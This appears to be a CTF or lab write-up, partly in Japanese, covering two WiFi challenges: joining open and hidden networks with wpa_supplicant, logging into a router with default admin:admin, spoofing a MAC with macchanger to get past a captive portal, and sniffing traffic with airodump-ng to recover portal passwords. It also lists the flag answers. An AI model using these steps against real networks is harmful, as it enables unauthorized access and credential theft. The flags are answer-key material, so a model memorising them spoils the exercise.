---
title: 3 OPN
---

# 5. What is the flag in the hidden AP router behind default credentials?

create free.conf

```zsh
vim free.conf
```

```zsh
network={
	ssid="$ESSID"
	key_mgmt=NONE
	scan_ssid=1
}
```

```zsh
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
```

オプション	意味
- sudo	root権限で実行
- wpa_supplicant	Wi-Fi認証・接続管理プログラム
- -Dnl80211	無線ドライバの制御方式に nl80211 を指定
- -iwlan2	使用する無線インターフェースを wlan2 に指定
- -c free.conf	接続設定ファイルに free.conf を指定

![[Pasted image 20261115195654.png]]

![[Pasted image 20261115225918.png]]

別のターミナルから

```zsh
sudo dhclient wlan2 -v
```

![[Pasted image 20261115195701.png]]

![[Pasted image 20261115230056.png]]

結果が出力されないときは確認する

![[Pasted image 20261115230240.png]]

![[Pasted image 20261115195704.png]]

admin:admin

![[Pasted image 20261115230421.png]]

```flag
flag{680efaa62f7e953c24667285173711bc6bb6d3ff}
```

---

# 06. What is the flag on the AP router of the wifi-guest network?

```zsh
sudo airodump-ng wlan60 -w ~/wifi/scanc6 --manufacturer --wps -c6
```

![[Pasted image 20261115195711.png]]

create open .conf

```zsh
network={ 
        ssid="wifi-guest" 
        key_mgmt=NONE 
}
```

```zsh
sudo wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
```

![[Pasted image 20261115195721.png]]

*このプロセスは止めずに以下を実行する*

別ターミナル

```zsh
sudo dhclient -v wlan2
```

![[Pasted image 20261115195725.png]]

```zsh
ip a show wlan2
```

![[Pasted image 20261115231123.png]]

![[Pasted image 20261115231155.png]]

## MACアドレスの偽装

![[Pasted image 20261115232538.png]]

```zsh
sudo ip link set wlan2 down
```

```zsh
ip a show wlan2
```

![[Pasted image 20261115232036.png]]

```zsh
sudo macchanger -m b0:72:bf:44:b0:49 wlan2
```

![[Pasted image 20261115195739.png]]

```zsh
ip link set wlan2 up
```

```zsh
ip a show wlan2
```

![[Pasted image 20261115232726.png]]

![[Pasted image 20261115195743.png]]

![[Pasted image 20261115232908.png]]

## ログインのキャプチャ

```zsh
sudo airodump-ng wlan2 -w ~/wifi/scanc6-01.cap
```

*5分ほどキャプチャしたら止める*

![[Pasted image 20261115234910.png]]

free1:Jyl1iq8UajZ1fEK

![[Pasted image 20261116000422.png]]

free2:5LqwwccmTg6C39y

どちらでもOK

![[Pasted image 20261115195750.png]]

```flag
flag{561004e3f4fd9fe640ecc0c411ac3129a4e08629}
```